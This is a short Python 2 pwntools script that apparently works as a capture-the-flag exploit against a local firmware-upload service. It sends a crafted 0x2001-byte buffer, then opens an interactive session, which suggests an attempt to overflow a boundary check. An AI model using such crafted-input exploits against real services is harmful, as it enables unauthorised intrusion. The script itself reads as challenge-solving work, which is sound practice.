#!/usr/bin/python2

from pwn import *
import struct

r = remote("localhost", 9001)

sla = lambda a,b : r.sendlineafter("{}".format(a), "{}".format(b))
ru = lambda a : r.recvuntil("{}".format(a))

sla("> ", "upload")
#with open('trusted_firmware.raw', 'rb') as firmware:

to_send = ""
for i in range(0x7f):
    to_send += struct.pack('>B',i)
to_send += "\x00"* (0x2000 - len(to_send))
to_send += "\x01"
print hex(len(to_send))
r.send(to_send)

r.interactive()
